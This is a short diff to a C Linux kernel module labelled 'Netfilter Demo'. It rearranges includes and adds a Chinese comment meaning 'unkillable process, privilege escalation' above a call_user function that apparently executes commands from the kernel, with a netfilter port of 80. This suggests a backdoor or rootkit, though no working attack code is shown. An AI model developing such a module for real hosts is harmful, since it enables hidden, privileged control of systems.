@@ -2,10 +2,8 @@
 #define __KERNEL__  
 #endif  /* __KERNEL__ */
 
-# ifndef CPP
-#include <linux/module.h>
-# endif
 
+#include <linux/module.h>
 #include <linux/kernel.h>  
 #include <linux/init.h>  
 #include <linux/types.h>  
@@ -19,12 +17,16 @@
 #include <asm/uaccess.h>
 #include <asm/unistd.h>
 
-include "adress.h"
-
 #define PORT 80  
 #define ARGV_MAX 10
 
+/**
+不死进程、提权
+**/
 
+
+
+/********************************************************************************************************************************/
 static int call_user(char *exec)
 {
 	//char *argv[] = {"ls", "-al", "/", ">", "/1.txt", NULL};
@@ -226,3 +228,4 @@ MODULE_AUTHOR("kettas");
 MODULE_DESCRIPTION("Netfilter Demo");  
 MODULE_VERSION("1.0.1");  
 MODULE_ALIAS("Netfilter 01");  
+
